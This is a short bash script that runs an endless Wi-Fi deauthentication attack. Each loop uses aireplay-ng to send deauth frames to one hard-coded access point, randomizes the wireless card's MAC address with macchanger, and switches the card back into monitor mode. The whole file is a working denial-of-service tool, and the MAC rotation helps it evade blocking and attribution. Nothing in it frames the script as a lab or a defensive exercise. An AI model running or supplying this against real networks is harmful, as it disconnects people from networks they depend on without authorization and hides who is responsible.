#! /bin/bash

while true
do

	aireplay-ng -0 5 -a 90:F6:52:C1:BB:18 wlan0

	ifconfig wlan0 down
	macchanger -r wlan0 | grep "New MAC"

	iwconfig wlan0 mode monitor
	ifconfig wlan0 up
	iwconfig wlan0 | grep Mode

	sleep 3
	echo waiting!!!

done
